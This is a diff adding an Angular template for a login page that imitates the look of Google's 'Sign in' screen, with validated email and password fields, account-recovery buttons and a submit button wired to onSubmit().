@@ -1,0 +1,65 @@
+<div class="Container">
+    <div class='imgset'>
+        <img srcset="/assets/logo2.PNG"/>
+    </div>
+    <div class='item1'>
+        <div>
+            <h1>Sign in</h1>
+        </div>
+        <div>
+            <h3>Use your Google Account</h3>
+        </div>
+        
+    </div>
+    <br>
+    <form [formGroup]="loginform" (ngSubmit)="onSubmit()">
+
+      <div class="inputlabel">
+        <mat-form-field class="example-full-width" appearance="outline">
+          <mat-label>username</mat-label>
+          <input formControlName="email" matInput placeholder="@gmail.com" [class.is-invalid]="f['email'].invalid && f['email'].touched">
+        </mat-form-field>
+      </div>
+      <div *ngIf="f['email'].invalid && f['email'].touched">
+        <div *ngIf="f['email'].errors && f['email'].errors['required']" class="leftside3">
+          <mat-error>email required</mat-error>
+        </div>
+        <div *ngIf="f['email'].errors && f['email'].errors['pattern']" class="leftside3">
+          <mat-error>invalid email</mat-error>
+        </div>
+      </div>
+    
+      <div class="leftside1">
+        <button style="color:blue" mat-button>Forgot email</button>
+      </div>
+      <br>
+      <div class="inputlabel">
+        <mat-form-field class="example-full-width" appearance="outline">
+            <mat-label>password</mat-label>
+            <input type="password" formControlName="password" matInput required>
+          </mat-form-field>
+      </div>
+      <div *ngIf="f['password'].invalid && f['password'].touched" class="leftside3">
+        <div *ngIf="f['password'].errors && f['password'].errors['required']">
+         <mat-error>password is required</mat-error> 
+        </div>
+      </div>
+      <div class="leftside2">
+        <button style="color:blue" mat-button>Forgot password</button>
+      </div>
+
+    
+
+    <br>
+    <div class="lastlabel">
+        <span class="item2">
+          <button style="color:blue" mat-button>Create account</button>
+        </span>
+        <span>
+          <button type="submit" [class.disabled]="loginform.invalid" mat-raised-button color="primary">Next</button>
+        </span>
+        
+      </div>
+    </form>
+    <!-- {{loginform.value | json}} -->
+</div>
